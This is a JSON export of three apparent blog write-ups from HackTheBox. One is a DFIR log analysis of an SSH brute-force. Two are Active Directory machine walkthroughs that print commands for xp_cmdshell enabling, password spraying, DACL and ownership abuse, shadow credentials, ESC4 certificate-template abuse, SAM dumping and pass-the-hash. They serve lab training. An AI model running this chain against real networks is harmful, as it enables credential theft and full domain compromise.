[
  {
    "title": "DFIR Sherlock Challenge - Brutus",
    "slug": "dfir-sherlock-challenge-brutus",
    "date": "2025-04-03",
    "category": "DFIR",
    "tags": [
      "DFIR",
      "HTB",
      "Defensive Security"
    ],
    "excerpt": "Digital Forensics and Incident Response (DFIR) challenge from HTB Sherlocks.",
    "content": "# Introduction\n\nThis is a DFIR challenge from HTB Sherlock. It's a very easy challenge, nothing fancy and crazy stuff. In this challenge, I dealth with two files that were given: the `auth.log` and `wtmp` file. \n\n> **wtmp** is a system log file in Unix and Linux that records all login and logout events, including system startups and shutdowns.\n{: .prompt-info }\n\n> **auth.log** is a system log in Unix/Linux that records authentication-related events, such as successful and failed login attemtps, SSH access, sudo commands, and other security-related activities. It is also used for monitoring authentication events and detecting suspicious activity. \n{: .prompt-info }\n\n|               | auth.log | wtmp |\n| :-------------| :---------|:--------|\n| Purpose | Tracks authentication-related events. | Logs user logins, logouts, and system reboots. |\n| Data Format | Plain text | Binary |\n| Recorded Events | Login attempts (success & failure),<br> SSH access, sudo usage user <br> switching, authentication failures | Successful logins, session durations, system  <br> reboots, and shutdowns |\n| Usage | Security monitoring, detecting bruteforce <br> attacks, privilege escalation tracking | User session tracking, forensic analysis of login <br> history |\n\n\n### Sherlock Scenario:\n\n> In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.\n{: .prompt-tip }\n\n# Challenge\n\nSo, the first goal in this challenge was to analyze the `auth.log` file and to determine the IP address used by the attacker to perform the brute force attack.\n\nI opened the `auth.log` file and as I expected, there were a lot of lines.\n\n![Desktop View](/sherlock-brutus/ss2.png)\n![Desktop View](sherlock-brutus/ss3.png)\n\nReading the `auth.log` file, I have noticed that there were a lot of `Failed password for invalid_user server_adm from` lines which gave the idea wherein there was a bruteforce attack performed. Along with this line was the IP of the attacker. At this point, I already achieved the 1st task which was to determine the IP adderss of the attacker.\n\nIt was indicated in the challenge that the bruteforce attack was successful and that the attacker was able to gain access to an account on the server. The next goal was to determine which account was compromised. \n\nSo using the `auth.log` file, I used grep to check for the keywords where there was a successful login. \n\n![Desktop View](/sherlock-brutus/ss4.png)\nFound it! So it was time for the next task. The next goal was to identify the timestamp when the attacker logged in manually to the server. Since the wtmp is a binary file, I can't just use `cat` or `strings` command to open it. I used a tool called `utmpdump` to be able to read the contents of the `wtmp` file. After which, I was able to cross reference the IP used by the attacker to the user that he was able to logged in. In this case, it was an easy look. (Well coz the challenge is very easy. It won't be like this if it was an insane one. Probably. Hahah).\n\n![Desktop View](/sherlock-brutus/ss5.png)\nThe next goal was to determine the session number assigned to the attacker for the user account from the one compromised from the bruteforce attack. So I went back to `auth.log` file to filter the session numbers and I got it. \n\nThis was the one.\n![Desktop View](/sherlock-brutus/ss6.png)\n\nDuring the time the attacker was logged in as the compromised user, the attacker added a new user as part of their persistence strategy on the server and assigned it with higher privileges. The next goal was to determine which user was this. So I went back to the `auth.log` file again and filtered `new user`.\n![Desktop View](/sherlock-brutus/ss7.png)\n\nThe next goal was to determine when did the attacker's first SSH session end. So I opened `wtmp` file again and checked the sequence where the IP attacker logged in and ended. That way I got the timestamp where the SSH session ended.\n\n![Desktop View](/sherlock-brutus/ss8.png)\nThe final goal was to determine what is the full command the attacker executed using sudo. In this case the attacker logged in to the user account that he created and executed the command. So I went back to `auth.log` file and filtered the `COMMAND` keyword.\n\n![Desktop View](/sherlock-brutus/ss9.png)\n\n# Conclusion\n\nThat's it for the challenge. It was a fun DFIR challenge."
  },
  {
    "title": "Active Directory Series - Machine 2",
    "slug": "active-directory-series-machine-2",
    "date": "2025-04-02",
    "category": "Active Directory",
    "tags": [
      "AD",
      "HTB",
      "Offensive Security"
    ],
    "excerpt": "EscapeTwo. Second machine in the Active Directory Exploitation track in HackTheBox. A little bit harder in my perspective, but it was fun.",
    "content": "# Introduction\n\nThis is the second machine of the revised and newly improved `Active Directory Exploitation` track in HackTheBox.\n\n![Desktop View](/ad-series-1/image1.png)\n\nThis machine was labeled \"Easy\" level, but to be honest it did not feel easy. I would say medium. It was fun and pain in the ass at the same time. I have encountered things in which I needed to do some further research on just to finish the machine. Anyways, I'll show you what is it about. The machine provided a credential for 1 user:\n\n User: rose\n password: KxEPkKe6R8su\n\n# Recon and Enum Phase\n\nThe usual. I ran an nmap scan:\n\n```\nnmap -sCV -p- --min-rate 300 -vv 10.10.11.51 \n```\n\n### Nmap results:\n\n```\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-01 12:49:20Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n|     Target_Name: SEQUEL\n|     NetBIOS_Domain_Name: SEQUEL\n|     NetBIOS_Computer_Name: DC01\n|     DNS_Domain_Name: sequel.htb\n|     DNS_Computer_Name: DC01.sequel.htb\n|     DNS_Tree_Name: sequel.htb\n|_    Product_Version: 10.0.17763\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-04-01T12:50:59+00:00; -1s from scanner time.\n| ssl-cert: Subject: commonName=DC01.sequel.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb\n| Issuer: commonName=sequel-DC01-CA\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49690/tcp open  msrpc         Microsoft Windows RPC\n49693/tcp open  msrpc         Microsoft Windows RPC\n49706/tcp open  msrpc         Microsoft Windows RPC\n49722/tcp open  msrpc         Microsoft Windows RPC\n49731/tcp open  msrpc         Microsoft Windows RPC\n49800/tcp open  msrpc         Microsoft Windows RPC\n```\n\nA bunch of open ports but hey! We can check if we can enumerate some shares unauthenticated.\n![Desktop View](/ad-series-2/ss1.png)\n\nWell, it seems that I was not that lucky. So I used the credentials that were given by the challenge.\n\n```\nnxc smb <IP> -u rose -p <password> --shares\n```\n\n![Desktop View](/ad-series-2/ss2.png)\n\nThat's cool. So I was able to retrieve information with that. So there was a share called **Accounting Department**. So I checked if I could access it. \n\n```\nsmbclient \\\\\\\\<IP>\\\\'Accounting Department' -U rose --password=<password>\n```\n\n![Desktop View](/ad-series-2/ss3.png)\n\nSo, yeah I could access it and there were two files as you can see on the screenshot above.\n![Desktop View](/ad-series-2/ss4.png)\n\nThe `sharedStrings.xml` looked juicy to me. So I opened it and I found it's a bunch of users and their password. \n![Desktop View](/ad-series-2/ss5.png)\n\nThough if you look closely, there is a user called `sa` and its password. \n> **sa** or (System Administrator) is the default built-in administrator account with the highest privileges.\n{: .prompt-info }\n\nWith that information, I was thinking maybe I could login to their SQL Server. I don't know. Just a thought. So I fired up another terminal and hit it with \nthis tender juicy hatdog ðŸŒ­ command: \n\n```\npython3 mssqlclient.py 'sa:<password>'@<IP>\n```\n\nAs you can see, I was able to logged in! This is great. There is an improvement. \n![Desktop View](/ad-series-2/ss6.png)\n\nFrom here on, I was checking if I could exfil some data, looked for some other juicy databases, but it wasn't tender juicy as I was expecting. Luckily, out of the blue, I remember\nsomething I have done before which is using `xp_cmdshell` to execute system commands on the SQL Server.  \n\n> **xp_cmdshell** is an extended stored procedure in Microsoft SQL Server that allows commands to be executed directy from it. This is disabled by default due to security considerations as it can be abused for privilege escalation and remote code execution. If a user with sysadmin priveleges enables `xp_cmdshell`, SQL Server can execute system commands with SQL Server's service account privileges, which is a major security risk.\n{: .prompt-danger}\n\n\nWith that information, I enabled `xp_cmdshell` so I could execute commands.\n\n### Enable `advanced options` and `xp_cmdshell`:\n\n```\nEXEC sp_configure 'show advanced options', 1;\n\nRECONFIGURE;\n\nEXEC sp_configure 'xp_cmdshell', 1;\n\nRECONFIGURE;\n```\n\n![Desktop View](/ad-series-2/ss7.png)\n\nNow, that's enabled. At this point, I was thinking of establishing a reverse shell. So with the help of <a href=\"https://revshells.com\" target=\"_blank\">Reverse Shell Generator</a>, I crafted my payload.\n![Desktop View](/ad-series-2/ss9.png)\n\nSince it's a windows system, of course it would be logical to use powershell payload, right? I don't know, but yeah. Based on my experience, it is much better to encode the payload to `Base64` so I chose the payload encoded in `Base64`. I also setup the listener on the side as well.\n\n![Desktop View](/ad-series-2/ss10.png)\n\nAfter executing the command above, I was able to spawn a shell on my machine.\n![Desktop View](/ad-series-2/ss11.png)\n\nSo, it seems that I am user `sequel\\sql_svc`. So first I tried looking around then when I went to `C:\\` directory, there was this folder named `SQL2019`. That's something interesting, right? So I checked its contents.\n![Desktop View](/ad-series-2/ss12.png)\n\n![Desktop View](/ad-series-2/ss13.png)\n\nI'm not sure what that was so I checked its contents as well.\n![Desktop View](/ad-series-2/ss14.png)\n\nThis is where it got interesting. As you can see in the screenshot above, there is a file called `sql-Configuration.INI`\n\n> `Configuration.INI` is a configuration file used to perform unattended installations of Microsoft SQL Server. So instead of manually selecting options in the SQL Server setup wizard, you can provide details in this file to automate the installation process.\n{: .prompt-info}\n\nWhat's interesting in this file is that, usually, one of the parameters is the password. So if I am not mistaken, this configuration file should have password in it. So I checked the contents of this configuration file.\n![Desktop View](/ad-series-2/ss15.png)\n\nSo, there it is. Password. What a tender juicy hatdog. ðŸŒ­\n\nI looked around to check for more things or information that would be useful eventually. I looked into the `C:\\users` directory to check who are the users and I found another user named `ryan`.\n![Desktop View](/ad-series-2/ss16.png)\n\n# Gaining Initial Foothold\n\nFrom here on, I was thinking maybe with all the passwords I got now could be used to this user `ryan`. Remember the `accounts.xlsx` that contained an xml file where there was a list of passwords and users. Though there was no ryan user there, I still copied all the password and put it in a `pass.txt` file. I also included the password from the configuration file. Who knows, we need all the resources we have to check for things, right? In that way, maybe we could hit some tender juicy hatdog ðŸŒ­ along the way. \n\nUsing `netexec` I tried to check if any of these passwords would fit for ryan so we could establish remote access using `evil-winrm`. \n\n```\nnxc winrm <IP> -u ryan -p pass.txt\n```\n\n![Desktop View](/ad-series-2/ss17.png)\n\nAnd would you look at that! We hit a hatdog ðŸŒ­. So I used that password to for the evil-winrm.\n\n```\nevil-winrm -i <IP> -u ryan -p <password>\n```\n\n![Desktop View](/ad-series-2/ss18.png)\n\nSo now I am logged in as `ryan`. I also got the user flag. At this point, it was time to look around and find a way to escalate privileges. So I transferred the `SharpHound.exe` from my machine to the victim machine using smbserver. \n\n```\npython3 smbserver.py <share name> -username <username> -password <password> <directory> -smb2support\n```\n\n![Desktop View](/ad-series-2/ss20.png)\n\n![Desktop View](/ad-series-2/ss21.png)\n\nAfter executing the SharpHound and extracting the zip file from its result, I fired up bloodhound to check for privesc paths. After looking around, this is what I got. So, I was not able to take a screenshot where their original names were showing so I had to improvise. Sorry about that. Anyways As you can see, `ryan` seemed to have the ability to take owenership of `ca_svc`.\n![Desktop View](/ad-series-2/ss22.png)\n\n> **WriteOwner** permission allows a user to change the ownership of an object (e.g., a user account, group, or computer)\n{:.prompt-warning}\n\n> In this case, `ryan` has `WriteOwner` permissions over `ca_svc`. This means `ryan` can change the owner of the `ca_svc` account to themselves. This will allow `ryan` to modify its permissions and give themselves full control over it, effectively granting themselves the same privileges as `ca_svc`.\n{:.prompt-info}\n\n# Privilege Escalation\nAt this point, that information could be used for a potential privilege escalation attack. So it's time to abuse the `WriteOwner` permission. I used `owneredit.py` from `Impacket` for this. \n\n```\nowneredit.py -action write -new-owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'\n```\n\n![Desktop View](/ad-series-2/ss24.png)\n\nNow the owner has been successfully modified, I can now change permissions. For the next step, I used `dacledit.py`. \n\nThis command modifies the Discretionary Access Control List (DACL) of `ca_svc` in Active Directory on the sequel.htb. This grants `FullControl` to `ryan`.\n\n```\npython3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' sequel.htb/ryan:<password>\n```\n\n| Command Option            | Explanation                                                   |\n| :-------------------------| :-------------------------------------------------------------|\n| -action 'write'           | Modification of DACL.                                         |\n| -rights 'FullControl'     | Grants **Full Control** permissions. Highest level of access. |\n| -principal 'ryan'         | The user whol will receive **Full Control**.                  |\n| -target 'ca_svc'          | The AD object whose permissions will be modified.             |\n| -sequel.htb/ryan:password | Credentials used to authenticate.                             |\n\n![Desktop View](/ad-series-2/ss25.png)\n\nAfter executing the command, DACL was modified successfully. At this point, I used `certipy` tool to interact with the `Active Directory Certificate Services` (AD CS). This tool can be used to enumerate, abuse, and misconfigure AD CS for privilege escalation or persistence.\n\n```\nsudo certipy-ad shadow auto -u 'ryan@sequel.htb' -p '<password>' -account 'ca_svc' -dc-ip <IP>\n```\n\n| Command Option            | Explanation                                                   |\n| :-------------------------| :-------------------------------------------------------------|\n| shadow auto               | Performs the **Shadow Credentials Attack**. This allows an attacker to gain persistence to <br> another AD user. |\n| -u 'ryan@sequel.htb'      | The user account being used to authenticate. |\n| -p '<password>'           | The password to login to AD. |\n| -account 'ca_svc'         | The target account whose access is being hijacked. |\n| -dc-ip                    | Specifies the Domain Controller (DC) IP address. |\n\nI got the NT hash for the user `ca_svc`.\n![Desktop View](/ad-series-2/ss26.png)\n\n\nFrom here on, I needed to search for vulnerable certificate templates. I'm referring to misconfigured templates that could allow attackers to escalate privileges via `ESC1`, `ESC2`, etc.\n\nSo first, I set the environment variable `KRB5CCNAME` to point a Kerberos credential cache file `ca_svc.ccache` in the current working directory `$PWD`. The rest of the command is explained below.\n\n```\nKRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip <IP> -vulnerable -stdout\n```\n\n| Command Option            | Explanation                                                   |\n| :-------------------------| :-------------------------------------------------------------|\n| certipy-ad find           | The main command to search for certificate templates in the AD Certificate Services <br>(AD CS) environment. |\n| -scheme ldap      | This specifies the authentication scheme to `ldap`.  |\n| -k           | This enables Kerberos authentication (using the ticket from KRB5CCNAME). |\n| -debug         | Enables debug output for troubleshooting. |\n| -target dc01.sequel.htb | This sets the target domain controller. |\n| -dc-ip <IP> | The IP address of the domain controller |\n| -vulnerable | This will list the only certificate templates that are vulnerable to exploitation. |\n| -stdout | This forces the output to be printed to the console |\n\n![Desktop View](/ad-series-2/ss27.png)\n\n![Desktop View](/ad-series-2/ss28.png)\n\n![Desktop View](/ad-series-2/ss28-1.png)\n\nAs you can see in the result of the command bove, I was able to determine what to do next. Indicated in the `vulnerabilities` section was the ESC4.\n\n> **ESC4** is a vulnerability that lets the attaker modify the Certificate Template to make it vulnerable. The conditions for this is that a low-privileged user has write permissions (e.g., `WriteProperty`, `WriteDacl`) on a certificate template.\n{:.prompt-warning}\n\n> We could use this for privilege escalation which could potentially lead to full domain compromise.\n{:.prompt-danger}\n\nWith the information above, it was time to crack thy bones. ðŸ¦´\n\n```\nKRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip <IP>\n```\n\n![Desktop View](/ad-series-2/ss29.png)\n\nI used this command to exploit AD CS. This will request a certificate for the `administrator@sequel.htb` account using the `DunderMifflinAuthentication` template. Since `ca_svc` has control over this template, it can generate a valid authentication certificate for `administrator`.\n\n```\nsudo certify-ad req -username 'ca_svc@sequel.htb' -hashes <hash> -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb -dc-ip <IP>\n```\n\n| Command Option            | Explanation                                                   |\n| :-------------------------| :-------------------------------------------------------------|\n| -username 'ca_svc@sequel.htb' | Authenticates as the `ca_svc` user. |\n| -hashes <hash>      | Uses the NTLM hash of `ca_svc` instead of a password |\n| -ca sequel-DC01-CA | Specifies the **Certificate Authority (CA)** server |\n| -target DC01.sequel.htb | Targets the **Domain Controller (DC01)** for the certificate request. |\n| -template DunderMifflinAuthentication | Specifies the certificate template to use for the request |\n| -upn administrator@sequel.htb | Requests a certificate as `administrator@sequel.htb`, allowing <br> authentication as the Domain Admin. |\n| -dc-ip <IP> | By this time, YOU GUYS / GAL ALREADY KNOW WHAT THIS HATDOG IS <BR> FOR RIGHT? |\n\n![Desktop View](/ad-series-2/ss30.png)\n\nSince I already have the `administrator.pfx` certificate that I could use to authenticate instead of using a password or hash.\n\n```\ncertipy-ad auth -pfx administrator.pfx -domain sequel.htb\n```\n\n| Command Option            | Explanation  |\n| :-------------------------| :-------------------------------------|\n| certipy-ad auth | Uses Certipy to authenticate to Active Directory. |\n| -pfx administrator.pfx | This specifies the PFX (Personal Information Exchange) certificate for authentication. |\n| -domain sequel.htb | Ya'll know what this does. |\n\n\nAnd now I got the administrator's hash. I could now log in as administrator using PtH attack.\n![Desktop View](/ad-series-2/ss31.png)\n\n```\nevil-winrm -i <IP> -u \"administrator\" -H <Hash>\n```\n\nI am now logged in as administrator! From here on, just locate where the root flag is. I already got mine.\n![Desktop View](/ad-series-2/ss32.png)\n\n# Conclusion\n\nThis is how I understand on how to attack this machine. If you have any other ways or methods in compromising this machine, or even deeper explanation on how things work, I am open for feedback and discussion. So please feel free to reachout at `reacher@dracozona.com`."
  },
  {
    "title": "Active Directory Series - Machine 1",
    "slug": "active-directory-series-machine-1",
    "date": "2025-03-30",
    "category": "Active Directory",
    "tags": [
      "AD",
      "HTB",
      "Offensive Security"
    ],
    "excerpt": "First machine in the Active Directory Exploitation tracks in HackTheBox. This is a chill machine, but full of new learnings.",
    "content": "# Introduction\n\nHello! I decided to take the `Active Directory Exploitation` track on HackTheBox. \n\n![Desktop View](/ad-series-1/image1.png)\n\nI don't know. Just to get my feet wet with AD attacks since I am planning to take the CPTS exam within this year. \nSo in the list of machines, this is the first machine and it is entitled \"CICADA\". Cool name and it is labeled easy. Is it? You'll see as you read further on my blog.\n\n# Recon and Enum Phase\n\nFirst, I ran an nmap scan to check for open ports:\n\n```\nnmap -sCV -p- --min-rate 300 -vv <IP> -Pn\n```\n\nWhile waiting for that to finish, it was indicated in the scan that there was port 139 and 445 and it was open. From that information, I fired up another terminal and \nuse crackmapexec to enumerate shares if that is possible. \n\n```\ncrackmapexec smb <IP> -u \"\" -p \"\" --shares\n```\n![Desktop View](ad-series-1/ss1.png)\n\nI have found 2 shares that has READ permissions. HR and IPC$. So I tried to connect to the HR share to see if I am allowed to do that and if so, to check if there are \nfiles that could be useful.\n![Desktop View](/ad-series-1/ss2.png)\n\nThere is one file entitled \"Notice from HR.txt\" that I found. I checked its contents and I found out that this was a welcome message to new hires and it was indicated in the message the default password that was provided to them. That is so juicy.\n![](/ad-series-1/ss3.png)\n\nAt this point, I was thinking maybe that there is a user who still uses the default password. You never know, right? So I fired up `crackmapexec` to enumerate users, but it shows nothing.\n\n```\ncrackmapexec smb <> -u \"\" -p \"\" --shares\n```\n![](/ad-series-1/ss4.png)\n\nSo I tried using another tool. I used `lookupsid` that is from `impacket`.\n> **lookupsid** is a tool that allows attackers to enumerate user SIDs (Security Identifiers) and group SIDs on a Windows System.\n{: .prompt-info }\n\nUsing `lookupsid` tool, I was able to retrieve the list of users.\n![](/ad-series-1/ss5.png)\n\n\nWith the list of users and the default password I got from the file, I executed a passwordspray attack using `netexec`.\n```\nnxc smb <IP> -u domain_users.txt -p <password> --continue-on-success\n```\nSo it seemed that `Michael Wrightson` did not change his default password. What a shame :<>\n![](/ad-series-1/ss6.png)\n\nI used the credentials of Michael to further enumerate users to check if there are any juicy information that I could retrieve from them.\n```\nnxc smb <IP> -u \"michael.wrightson\" -p <password> --users\n```\n\nAfter executing the command, I found a user that has a description about his password. So now I also have the credentials of David Orelious. This is getting interesting. \n\n![](/ad-series-1/ss7.png)\n\nSince I've got 2 users with credentials already and I tried checking if I can use them to access the DEV share that I found earlier. The user `David` was the one that got in.\n```\nsmbclient -U david.orelious \\\\\\\\{IP Address}\\\\DEV\n```\n\n I found a powershell script inside the share which was interesting since the filename was `Backup_script.ps1`\n ![](/ad-series-1/ss8.png)\n\nI looked into the file and I found another user and its password! \n ![](/ad-series-1/ss9.png)\n\n# Gaining Initial Foothold\n\nThis is the part where I gained initial access. I used the credentials of emily to initiate remote connection using `evil-winrm` tool. \n> **evil-winrm** is a tool that provides remote shell access to Windows machines over WinRM (Windows Remote Management)\n{: .prompt-warning }\n\n```\nevil-winrm -i <IP> -u emily.oscars -p <password>\n```\n\nI have now a remote access through the user `Emily`.\n ![](/ad-series-1/ss10.png)\n\nAt this point, I got myself into a rabbit hole, so I'm gonna skip that part where I go back and forth with some things and go directly on how to escalate privileges. \n\n# Privilege Escalation\n\nFirst I checked which privileges I got using the user `Emily`. I found out that it has `SeBackupPrivilege` set to `Enabled`.\n ![](/ad-series-1/ss12.png)\n> **SeBackupPrivilege** is a User Right Assignment in Windows Active Directory (AD) that allows a user or process to bypass file and directory security restrictions for backup purposes. Attackers who gain this privilege can bypass access controls and read sensitive files, including NTDS.dit (which contains AD password hashes). It can be abused to escalate privileges by copying and extracting credentials from SAM, SYSTEM, or other critical files.\n{: .prompt-danger }\n\nI made a backup of SAM and SYSTEM using `reg save` command and downloaded them to my machine.\n ![](/ad-series-1/ss13.png)\n\nUsing the tool `secretsdump.py` I was able to dump the hash of the Administrator.\n ![](/ad-series-1/ss15.png)\n\nWith the Administrator hash I got, I used Pass the Hash attack to successfully logged in as Administrator.\n ![](/ad-series-1/ss16.png)\n\n# Conclusion\n\nThat's how I completed this challenge. Thank you for reading! I hope you learned something from here."
  }
]